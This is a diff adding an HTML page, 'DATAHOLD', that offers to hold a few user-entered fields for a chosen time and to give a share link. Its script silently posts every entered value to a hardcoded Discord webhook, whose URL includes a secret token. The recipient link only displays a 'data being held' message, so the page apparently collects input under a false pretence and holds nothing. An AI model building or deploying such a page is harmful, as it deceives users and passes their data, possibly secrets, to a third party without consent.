@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DATAHOLD</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      text-align: center;
+      padding: 2rem;
+    }
+    .container {
+      background: white;
+      padding: 2rem;
+      border-radius: 10px;
+      max-width: 600px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    input, select, button {
+      margin: 0.5rem;
+      padding: 0.5rem;
+      font-size: 1rem;
+      width: 90%;
+    }
+    .field-group {
+      margin-bottom: 1rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="main">
+    <h1>DATAHOLD</h1>
+    <label for="numFields">Number of Fields:</label>
+    <select id="numFields" onchange="renderFields()">
+      <option value="1">1</option>
+      <option value="2" selected>2</option>
+      <option value="3">3</option>
+      <option value="4">4</option>
+    </select>
+
+    <div id="fields"></div>
+
+    <label for="duration">Hold Duration (minutes):</label>
+    <input type="number" id="duration" value="10" min="1">
+
+    <button onclick="holdData()">HOLD DATA</button>
+  </div>
+
+  <div class="container" id="confirmation" style="display:none">
+    <h2>Data Held until <span id="expireTime"></span></h2>
+    <p><a id="shareLink" href="#" target="_blank">Share with recipient</a></p>
+  </div>
+
+  <script>
+    function renderFields() {
+      const num = document.getElementById('numFields').value;
+      const container = document.getElementById('fields');
+      container.innerHTML = '';
+      for (let i = 1; i <= num; i++) {
+        const field = document.createElement('input');
+        field.placeholder = `Enter field ${i}`;
+        field.id = `field${i}`;
+        container.appendChild(field);
+      }
+    }
+
+    function holdData() {
+      const num = parseInt(document.getElementById('numFields').value);
+      const duration = parseInt(document.getElementById('duration').value);
+      const fields = [];
+      for (let i = 1; i <= num; i++) {
+        const val = document.getElementById(`field${i}`).value;
+        fields.push(`Field ${i}: ${val}`);
+      }
+
+      const timestamp = new Date(Date.now() + duration * 60000);
+      const id = Math.random().toString(36).substring(2, 10);
+      const webhookUrl = "https://discord.com/api/webhooks/1367643178462875729/2GDnCfg7bFB6Xa4dLFAYafqZq5_LN5wAvnT06ju8vBXaJ9xIvnFnYkzKIjsnAw3ISj7x";
+
+      const data = {
+        content: `DATAHOLD CREATED\n${fields.join("\n")}\nHeld until: ${timestamp.toLocaleString()}\nLink: https://datahold.fiscon.cc/#${id}`
+      };
+
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      });
+
+      document.getElementById('main').style.display = 'none';
+      document.getElementById('confirmation').style.display = 'block';
+      document.getElementById('expireTime').innerText = timestamp.toLocaleString();
+      document.getElementById('shareLink').href = `https://datahold.fiscon.cc/#${id}`;
+    }
+
+    window.onload = function() {
+      renderFields();
+      const hash = window.location.hash;
+      if (hash.length > 1) {
+        document.body.innerHTML = `
+          <div class="container">
+            <h2>Data being held</h2>
+            <p>Check back later or contact the sender.</p>
+          </div>
+        `;
+      }
+    }
+  </script>
+</body>
+</html>
